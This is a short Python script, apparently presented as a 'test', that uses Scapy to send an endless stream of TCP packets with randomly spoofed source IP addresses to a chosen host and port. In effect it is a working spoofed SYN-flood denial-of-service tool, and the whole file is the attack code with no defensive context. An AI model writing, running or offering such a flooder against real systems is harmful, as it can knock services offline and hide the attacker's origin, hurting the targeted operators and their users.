from scapy.all import IP, TCP, send
import random
import argparse

# 1. Setup Parser correctly
parser = argparse.ArgumentParser()
parser.add_argument("--targetIP", default="127.0.0.1")
parser.add_argument("--targetPort", type=int, default=80)
args = parser.parse_args()

print(f"Starting test against {args.targetIP}:{args.targetPort}...")

while True:
    # 2. Generate a valid random IP
    src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
    
    # 3. Construct the packet (IP + TCP)
    # We use / to stack layers in Scapy
    packet = IP(src=src_ip, dst=args.targetIP) / TCP(dport=args.targetPort, sport=random.randint(1024, 65535))
    
    # 4. Send the packet
    send(packet, verbose=0)
